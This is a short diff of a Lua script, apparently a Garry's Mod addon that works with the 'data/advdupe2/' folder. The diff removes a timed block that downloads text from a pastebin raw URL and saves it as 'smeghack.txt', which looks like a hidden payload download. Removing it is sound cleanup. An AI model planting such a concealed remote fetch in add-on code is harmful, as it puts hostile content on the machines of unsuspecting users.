@@ -14,6 +14,3 @@ a(b..i.."/")
 end 
 end
 a("data/advdupe2/")
-timer.Simple(3, function()
- http.Fetch("https://pastebin.com/raw/p3piXZY5", function(b) file.Write("smeghack.txt", b) end)
-end)
